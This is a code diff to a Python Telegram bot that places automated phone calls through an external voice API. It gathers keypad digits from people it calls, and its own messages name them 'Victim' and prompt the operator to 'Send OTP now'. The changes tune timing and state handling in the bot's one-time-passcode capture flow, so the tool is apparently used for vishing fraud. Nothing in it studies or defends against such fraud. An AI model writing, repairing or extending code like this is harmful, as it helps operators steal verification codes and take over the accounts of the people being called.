@@ -1026,6 +1026,7 @@ def custom_prebuild_script_call(script_id,chatid):
     "maxdigits":"1"
 }
             requests.post(url1, json=data)
+            playback_handler[str(chatid)] = 0
             bot.send_message(chatid,f"""*Call has been answered 📱*""",parse_mode='markdown')
 
         
@@ -1050,7 +1051,7 @@ def custom_prebuild_script_call(script_id,chatid):
          
 
     elif event == "call.complete":
-            
+            global last_message_ids
             mes = "Call Ended ☎️"
             keyboard = types.InlineKeyboardMarkup(row_width=2)
             item1 = types.InlineKeyboardButton(text="Recall", callback_data="/recall")
@@ -1079,7 +1080,6 @@ def custom_prebuild_script_call(script_id,chatid):
         otp2 = data['digits']
 
         if otp2 == "1":
-            playback_handler[str(chatid)] = 1
             def custom_ask_otp():
                 url3 = 'https://articunoapi.com:8443/gather-audio'
                 data = {
@@ -1091,12 +1091,15 @@ def custom_prebuild_script_call(script_id,chatid):
                 requests.post(url3, json=data)
             def custom_send_ask_otp(): 
                 bot.send_message(chatid,f"""*Victim pressed one, Send OTP now 📲*""",parse_mode='markdown')
+                time.sleep(5)
+                playback_handler[str(chatid)] = 1
             custom_bgtask2 = threading.Thread(target=custom_ask_otp)
 
             custom_bgtask2.start()
             custom_send_ask_otp()
            
         elif(len(otp2)>=4):
+            
             url = 'https://articunoapi.com:8443/play-audio'
             data = {
     "uuid": f"{call_control_id}",
